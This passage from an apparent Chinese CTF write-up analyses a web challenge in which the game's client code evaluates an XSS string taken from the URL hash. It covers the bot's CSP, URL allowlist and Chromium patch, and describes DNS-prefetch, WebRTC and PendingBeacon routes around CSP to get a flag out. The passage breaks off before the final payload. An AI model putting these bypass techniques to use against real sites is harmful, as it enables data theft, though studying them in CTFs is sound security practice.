class="keyword">new</span> <span class="title class_">Map</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;found&#x27;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> onlineMode = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> state = &#123;&#125;;</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;onlineHost&#125;</span>/status`</span>);</span><br><span class="line">		onlineMode = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;online&#x27;</span>) ?? <span class="literal">false</span>;</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;online-enabled&#x27;</span>).<span class="property">checked</span> = onlineMode;</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;online-enabled&#x27;</span>).<span class="property">onchange</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;online&#x27;</span>) === <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="title function_">alert</span>(<span class="string">&quot;NOTE: Online mode exists purely for fun and is not part of the challenge solution. You should not attempt to hack the online mode server.\nPlease don&#x27;t ruin the fun for everyone else by trying to abuse online mode!\nYou and your team WILL be disqualified if you&#x27;re found to be trying to attack the server in any way.\nYOU HAVE BEEN WARNED!&quot;</span>)</span><br><span class="line">			&#125;</span><br><span class="line">			onlineMode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;online-enabled&#x27;</span>).<span class="property">checked</span>;</span><br><span class="line">			<span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;online&#x27;</span>, onlineMode);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;online&#x27;</span>).<span class="title function_">removeAttribute</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;search&#x27;</span>).<span class="property">onkeyup</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">const</span> element <span class="keyword">of</span> <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;element&#x27;</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!element.<span class="property">innerText</span>.<span class="title function_">toLowerCase</span>().<span class="title function_">includes</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;searchbox&#x27;</span>).<span class="property">value</span>.<span class="title function_">toLowerCase</span>())) &#123;</span><br><span class="line">			element.<span class="title function_">setAttribute</span>(<span class="string">&#x27;hidden&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			element.<span class="title function_">removeAttribute</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">evaluate</span> = (<span class="params">...items</span>) =&gt; &#123;</span><br><span class="line">	<span class="keyword">const</span> [a, b] = items.<span class="title function_">sort</span>();</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">const</span> [ingredientA, ingredientB, result] <span class="keyword">of</span> recipes) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a: &quot;</span> + a + <span class="string">&quot;b: &quot;</span>+ b);</span><br><span class="line">		<span class="keyword">if</span> (ingredientA === a &amp;&amp; ingredientB == b) &#123;</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(state.<span class="property">xss</span>);</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">			<span class="keyword">if</span> (result === <span class="string">&#x27;XSS&#x27;</span> &amp;&amp; state.<span class="property">xss</span>) &#123;</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;eval here&quot;</span>);</span><br><span class="line">				<span class="built_in">eval</span>(state.<span class="property">xss</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">colliding</span> = (<span class="params">elementA, elementB</span>) =&gt; &#123;</span><br><span class="line">	<span class="keyword">const</span> [a, b] = [elementA.<span class="title function_">getBoundingClientRect</span>(), elementB.<span class="title function_">getBoundingClientRect</span>()];</span><br><span class="line">	<span class="keyword">return</span> a.<span class="property">right</span> &gt;= b.<span class="property">left</span> &amp;&amp; a.<span class="property">left</span> &lt;= b.<span class="property">right</span> &amp;&amp; a.<span class="property">bottom</span> &gt;= b.<span class="property">top</span> &amp;&amp; a.<span class="property">top</span> &lt;= b.<span class="property">bottom</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">hash</span> = (<span class="params">...args</span>) =&gt; <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(args);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">create</span> = element =&gt; &#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="title function_">tryCombine</span> = <span class="keyword">async</span> (<span class="params">into, hover</span>) =&gt; &#123;</span><br><span class="line">		<span class="keyword">const</span> [a, b] = [into.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-name&#x27;</span>), hover.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-name&#x27;</span>)].<span class="title function_">sort</span>();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">let</span> result = evaluate(a, b);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (onlineMode &amp;&amp; !result) &#123;</span><br><span class="line">			<span class="keyword">if</span> (cache.<span class="title function_">has</span>(<span class="title function_">hash</span>(a, b))) &#123;</span><br><span class="line">				result = cache.<span class="title function_">get</span>(<span class="title function_">hash</span>(a, b));</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				cache.<span class="title function_">set</span>(<span class="title function_">hash</span>(a, b), <span class="literal">null</span>);</span><br><span class="line">				<span class="keyword">let</span> res;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					res = <span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;onlineHost&#125;</span>/combine?a=<span class="subst">$&#123;a&#125;</span>&amp;b=<span class="subst">$&#123;b&#125;</span>`</span>)).<span class="title function_">json</span>();</span><br><span class="line">				&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">					<span class="title function_">alert</span>(<span class="string">&#x27;failed to reach online mode endpoint!&#x27;</span>);</span><br><span class="line">					<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;online-enabled&#x27;</span>).<span class="title function_">click</span>();</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (!res.<span class="property">result</span>) &#123;</span><br><span class="line">					<span class="title function_">alert</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(res));</span><br><span class="line">					result = <span class="literal">null</span>;</span><br><span class="line">					cache.<span class="title function_">delete</span>(<span class="title function_">hash</span>(a, b));</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">const</span> [element, emoji] = res.<span class="property">result</span>;</span><br><span class="line">					elements.<span class="title function_">set</span>(element, emoji);</span><br><span class="line">					result = element;</span><br><span class="line">					cache.<span class="title function_">set</span>(<span class="title function_">hash</span>(a, b), element);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (result) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!found.<span class="title function_">has</span>(result)) &#123;</span><br><span class="line">				<span class="title function_">create</span>(result);</span><br><span class="line">				found.<span class="title function_">set</span>(result, elements.<span class="title function_">get</span>(result));</span><br><span class="line">				<span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;found&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>([...found.<span class="title function_">entries</span>()]));</span><br><span class="line">			&#125;</span><br><span class="line">			into.<span class="property">innerText</span> = <span class="string">`<span class="subst">$&#123;elements.get(result)&#125;</span> <span class="subst">$&#123;result&#125;</span>`</span>;</span><br><span class="line">			into.<span class="title function_">setAttribute</span>(<span class="string">&#x27;data-name&#x27;</span>, result);</span><br><span class="line">			hover.<span class="title function_">remove</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> button = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">	button.<span class="property">innerText</span> = <span class="string">`<span class="subst">$&#123;elements.get(element)&#125;</span> <span class="subst">$&#123;element&#125;</span>`</span>;</span><br><span class="line">	button.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;element&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	button.<span class="property">onmousedown</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">		<span class="keyword">const</span> atom = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">		atom.<span class="property">innerText</span> = button.<span class="property">innerText</span>;</span><br><span class="line">		atom.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;atom&#x27;</span>);</span><br><span class="line">		atom.<span class="property">style</span>.<span class="property">zIndex</span> = <span class="number">102</span>;</span><br><span class="line"></span><br><span class="line">		atom.<span class="title function_">setAttribute</span>(<span class="string">&#x27;data-name&#x27;</span>, element);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> <span class="title function_">move</span> = (<span class="params">x, y</span>) =&gt; &#123;</span><br><span class="line">			atom.<span class="property">style</span>.<span class="property">left</span> = <span class="string">`<span class="subst">$&#123;x - atom.offsetWidth / <span class="number">2</span>&#125;</span>px`</span>;</span><br><span class="line">			atom.<span class="property">style</span>.<span class="property">top</span> = <span class="string">`<span class="subst">$&#123;y - atom.offsetHeight / <span class="number">2</span>&#125;</span>px`</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="title function_">move</span>(e.<span class="property">pageX</span>, e.<span class="property">pageY</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> <span class="title function_">onMove</span> = e =&gt; <span class="title function_">move</span>(e.<span class="property">pageX</span>, e.<span class="property">pageY</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, onMove);</span><br><span class="line"></span><br><span class="line">		atom.<span class="property">onmousedown</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">			atom.<span class="property">style</span>.<span class="property">zIndex</span> = <span class="number">102</span>;</span><br><span class="line">			<span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, onMove);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		atom.<span class="property">onmouseup</span> = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_">colliding</span>(atom, buttons)) <span class="keyword">return</span> atom.<span class="title function_">remove</span>();</span><br><span class="line">			atom.<span class="property">style</span>.<span class="property">zIndex</span> = <span class="number">101</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">const</span> other <span class="keyword">of</span> <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;atom&#x27;</span>)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (other === atom) <span class="keyword">continue</span>;</span><br><span class="line">				other.<span class="property">style</span>.<span class="property">zIndex</span> = <span class="number">100</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable language_">document</span>.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, onMove);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">const</span> <span class="title function_">loadingOn</span> = (<span class="params">...items</span>) =&gt; &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> items) &#123;</span><br><span class="line">					item.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;50%&#x27;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">const</span> <span class="title function_">loadingOff</span> = (<span class="params">...items</span>) =&gt; &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> items) &#123;</span><br><span class="line">					item.<span class="property">style</span>.<span class="property">opacity</span> = <span class="literal">null</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">const</span> into <span class="keyword">of</span> <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;atom&#x27;</span>)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (into === atom) <span class="keyword">continue</span>;</span><br><span class="line">				<span class="keyword">if</span> (<span class="title function_">colliding</span>(into, atom)) &#123;</span><br><span class="line">					<span class="title function_">loadingOn</span>(into, atom);</span><br><span class="line">					<span class="keyword">await</span> <span class="title function_">tryCombine</span>(into, atom);</span><br><span class="line">					<span class="title function_">loadingOff</span>(into, atom);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		atom.<span class="property">oncontextmenu</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">			e.<span class="title function_">preventDefault</span>();</span><br><span class="line">			atom.<span class="title function_">remove</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(atom);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	buttons.<span class="title function_">appendChild</span>(button);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> [element, emoji] <span class="keyword">of</span> found.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">	elements.<span class="title function_">set</span>(element, emoji);</span><br><span class="line">	<span class="title function_">create</span>(element);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	state = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title function_">atob</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)));</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(state);</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(found);</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(state.<span class="property">recipe</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">const</span> [a, b] <span class="keyword">of</span> state.<span class="property">recipe</span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>([a, b]);</span><br><span class="line">		<span class="keyword">if</span> (!found.<span class="title function_">has</span>(a) || !found.<span class="title function_">has</span>(b)) &#123;</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;not found error&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;evaluate here&quot;</span>);</span><br><span class="line">		<span class="keyword">const</span> result = evaluate(a, b);</span><br><span class="line">		found.<span class="title function_">set</span>(result, elements.<span class="title function_">get</span>(result));</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error&quot;</span>)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>慢慢看可以看得出来在index.mjs中的<code>/remoteCraft</code>可以访问<code>visit</code>函数，visit函数里起了一个新的<code>chromium</code>浏览器进程，它会带着base64加密后的state访问<code>127.0.0.1:8080</code></p>
+<p>然后state就有我们的flag</p>
+<p>接下来就是将flag带出的问题</p>
+<p>这里很容易想到xss，而且题目一直在暗示我们xss</p>
+<p><code>remoteCraft</code>里面需要我们传<code>recipe</code>参数，然后是一个json，json里面包含<code>recipe和xss</code>，它可以帮我们批量合成元素</p>
+<p>然后xss和recipe都得有分别满足的条件</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">assert</span>(<span class="keyword">typeof</span> xss === <span class="string">&#x27;string&#x27;</span>);</span><br><span class="line">			<span class="title function_">assert</span>(xss.<span class="property">length</span> &lt; <span class="number">300</span>);</span><br><span class="line">			<span class="title function_">assert</span>(recipe <span class="keyword">instanceof</span> <span class="title class_">Array</span>);</span><br><span class="line">			<span class="title function_">assert</span>(recipe.<span class="property">length</span> &lt; <span class="number">50</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">const</span> step <span class="keyword">of</span> recipe) &#123;</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(step)</span><br><span class="line">				<span class="title function_">assert</span>(step <span class="keyword">instanceof</span> <span class="title class_">Array</span>);</span><br><span class="line">				<span class="title function_">assert</span>(step.<span class="property">length</span> === <span class="number">2</span>);</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">const</span> element <span class="keyword">of</span> step) &#123;</span><br><span class="line">					<span class="title function_">assert</span>(<span class="keyword">typeof</span> xss === <span class="string">&#x27;string&#x27;</span>);</span><br><span class="line">					<span class="title function_">assert</span>(element.<span class="property">length</span> &lt; <span class="number">50</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
+<p>然后才能够进到visit</p>
+<p>反正就是依托</p>
+<p>再看index.js</p>
+<img src="/posts/undefined/9.png" class title="awa">
+<p>有个evaluate函数能够eval我们传进去的state.xss</p>
+<p>但是前面有检验</p>
+<img src="/posts/undefined/10.png" class title="awa">
+<p>从总配方中取出配方再判断能不能合成xss(相当于问你有没有解锁xss，这里的found就是已经解锁的元素)</p>
+<p>如果有就会eval(state.xss)</p>
+<p>这里<code>state = JSON.parse(atob(window.location.hash.slice(1)));</code></p>
+<p>其实就是<code>#</code>后面的东西经过base64解码后的结果</p>
+<p>这里不信可以自己手操一下</p>
+<p>那这样就可以大概理解这个流程了：</p>
+<ul>
+<li>先解锁xss这个元素(或者找到解锁xss的路径)，然后<code>remoteCraft</code>打payload</li>
+<li>打完payload后进入visit函数，然后起了一个新的浏览器进程</li>
+<li>该浏览器访问了<code>127.0.0.1:8080</code>，并且携带<code>#data</code>，data内有我们的payload</li>
+<li>通过evaluate函数进行eval(data)，打xss并将flag带出</li>
+</ul>
+<p>基本原理弄懂了，想打xss了，然后看看实际上有多困难</p>
+<h2><span id="限制条件"> 限制条件</span></h2>
+<ul>
+<li>CSP</li>
+</ul>
+<p>在createServer里有一个csp：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> csp =  [</span><br><span class="line">		<span class="string">&quot;default-src &#x27;none&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;style-src &#x27;unsafe-inline&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;script-src &#x27;unsafe-eval&#x27; &#x27;self&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;frame-ancestors &#x27;none&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;worker-src &#x27;none&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;navigate-to &#x27;none&#x27;&quot;</span></span><br><span class="line">	]</span><br></pre></td></tr></table></figure>
+<p>这里我想利用johnfrod师傅的csp绕过：</p>
+<p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/csp%E7%AD%96%E7%95%A5%E4%B8%8E%E7%BB%95%E8%BF%87/">绕csp</a></p>
+<p>发现不行，他这个csp里的<code>script-src</code>不是<code>unsafe-inline</code></p>
+<p>而且也没有可以利用的cdn等网站</p>
+<p>这里这个csp是基本上超级强大，如果有师傅知道这个csp能绕的话还请教教我T_T</p>
+<ul>
+<li>浏览器</li>
+</ul>
+<p>这里浏览器还有一个<code>policy.json</code>的限制</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;URLAllowlist&quot;</span>:[<span class="string">&quot;127.0.0.1:8080&quot;</span>],<span class="string">&quot;URLBlocklist&quot;</span>:[<span class="string">&quot;*&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
+<p>只允许访问<code>127.0.0.1:8080</code>，限制了其他的页面</p>
+<img src="/posts/undefined/11.png" class title="awa">
+<ul>
+<li>chromium.diff</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl b/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl</span><br><span class="line">index f0948629cb..393e7c77e0 100644</span><br><span class="line">--- a/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl</span><br><span class="line">+++ b/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl</span><br><span class="line">@@ -61,10 +61,7 @@ enum RTCPeerConnectionState &#123;</span><br><span class="line"> // https://w3c.github.io/webrtc-pc/#interface-definition</span><br><span class="line"></span><br><span class="line"> [</span><br><span class="line">-    ActiveScriptWrappable,</span><br><span class="line">-    Exposed=Window,</span><br><span class="line">-    LegacyWindowAlias=webkitRTCPeerConnection,</span><br><span class="line">-    LegacyWindowAlias_Measure</span><br><span class="line">+    ActiveScriptWrappable</span><br><span class="line"> ] interface RTCPeerConnection : EventTarget &#123;</span><br><span class="line">     // TODO(https://crbug.com/1318448): Deprecated `mediaConstraints` should be removed.</span><br><span class="line">     [CallWith=ExecutionContext, RaisesException] constructor(optional RTCConfiguration configuration = &#123;&#125;, optional GoogMediaConstraints mediaConstraints);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>还有一段通过<code>network_prediction_options:2</code>的方式阻止了预加载</p>
+<p>这里具体是啥呢？</p>
+<p>看了国外大佬的解释，这里是说对<code>WebRTCpeerconnection</code>打补丁，因为在WebRTC中有一种利用DNS解析的方式从子域向外部发送消息，从而绕过csp的方法</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/jp/pentesting-web/content-security-policy-csp-bypass#webrtc">Content Security Policy (CSP) Bypass | Japanese - Ht | HackTricks</a></p>
+<p>同样道理，利用<code>link</code>标签的<code>dns-prefetch</code>预读功能就能够通过DNS绕过CSP</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/jp/pentesting-web/content-security-policy-csp-bypass#dns-prefetch">Content Security Policy (CSP) Bypass | Japanese - Ht | HackTricks</a></p>
+<p>具体的文章也po在上面了</p>
+<p>如果想看中文的可以看这个</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/pentesting-web/content-security-policy-csp-bypass">Content Security Policy (CSP) Bypass | Chinese - Ht | HackTricks</a></p>
+<img src="/posts/undefined/12.png" class title="awa">
+<img src="/posts/undefined/13.png" class title="awa">
+<p>所以各种绕csp的方法都被限制了</p>
+<ul>
+<li>内核版本</li>
+</ul>
+<p>我这里受到XCTF的xssbot的影响，想着也能够靠<code>CVE-2023-4357</code>的chromeXXE来读flag，但是并不行</p>
+<p>这边可以根据出题人给的docker文件来起环境，然后查看内核版本</p>
+<img src="/posts/undefined/chrome.png" class title="awa">
+<p>这里很可惜，是<code>Chromium 122.0.6261.111 unstable</code></p>
+<p>是一个很新的内核(xxe的影响版本在<code>Chrome &lt; 116.0.5845.96</code>)</p>
+<p><a target="_blank" rel="noopener" href="https://chromestatus.com/roadmap">Chrome Platform Status (chromestatus.com)</a></p>
+<p>这个网址可以查看最新版内核</p>
+<h2><span id="突破"> 突破</span></h2>
+<p>所以这个题就很离谱，各种防御都做上了，基本上找不到能绕过的点</p>
+<p>所以出题者是想让我们寻找新的绕过csp方法</p>
+<p>突破口在哪呢？</p>
+<p>在这个浏览器启动的参数：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> proc = <span class="title function_">spawn</span>(</span><br><span class="line">		<span class="string">&#x27;/usr/bin/chromium-browser-unstable&#x27;</span>, [</span><br><span class="line">			<span class="string">`--user-data-dir=<span class="subst">$&#123;userDataDir&#125;</span>`</span>,</span><br><span class="line">			<span class="string">&#x27;--profile-directory=Default&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;--no-sandbox&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;--js-flags=--noexpose_wasm,--jitless&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;--disable-gpu&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;--no-first-run&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;--enable-experimental-web-platform-features&#x27;</span>,</span><br><span class="line">			<span class="string">`http://127.0.0.1:8080/#<span class="subst">$&#123;Buffer.<span class="keyword">from</span>(<span class="built_in">JSON</span>.stringify(state)).toString(<span class="string">&#x27;base64&#x27;</span>)&#125;</span>`</span></span><br><span class="line">		],</span><br><span class="line">		&#123; <span class="attr">detached</span>: <span class="literal">true</span> &#125;</span><br><span class="line">	)</span><br></pre></td></tr></table></figure>
+<p>可以发现它启用了<strong>实验性功能</strong>，这些实验性功能有些可能会不受csp的控制</p>
+<p>这就是突破点了，找一下内核122(或者之前的实验性功能)，可以翻到<code>Chrome 121</code>里有一个fetch(它和xss里的fetch可能有联系)</p>
+<img src="/posts/undefined/14.png" class title="awa">
+<img src="/posts/undefined/15.png" class title="awa">
+<p>这个api他能够发请求</p>
+<p>大概意思是：他要在页面关掉之后才能发请求</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/WICG/pending-beacon/blob/main/docs/fetch-later-api.md">pending-beacon/docs/fetch-later-api.md at main · WICG/pending-beacon · GitHub</a></p>
+<p>反正读这个api就很抽象</p>
+<p>按照平时页面关闭就能发请求，它这个肯定是能用了</p>
+<p>但是它是直接把进程杀了。。。</p>
+<img src="/posts/undefined/16.png" class title="awa">
+<p>导致请求发不过来，这就很难受</p>
+<p>但是功夫不负有心人，可以在这个api文档里看到另一个<code>pending-beacon-api</code>(这个fetchlater的motivation)</p>
+<p>它也是可以发请求的：</p>
+<img src="/posts/undefined/17.png" class title="awa">
+<p>而且它还不需要等页面关闭，这里直接用这个pending beacon打就好了，注意，这里的pending beacon似乎只能够向https发送请求：</p>
+<h2><span id="解决"> 解决</span></h2>
+<p>利用脚本先找出xss的合成路线：</p>
